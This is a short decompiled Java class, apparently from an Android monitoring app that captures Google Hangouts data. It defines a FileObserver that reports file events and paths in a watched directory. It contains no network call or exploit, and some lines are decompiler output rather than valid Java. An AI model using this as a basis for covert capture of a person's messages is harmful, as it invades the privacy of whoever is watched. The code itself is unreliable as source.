package com.vvt.capture.hangouts.b;

import android.os.FileObserver;

class b
  extends FileObserver
{
  private String b;
  
  public b(a parama, String paramString, int paramInt)
  {
    super(paramString, paramInt);
    this.b = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Object localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    String str = this.b;
    localObject = str + "/" + paramString;
    this.a.a(paramInt, (String)localObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */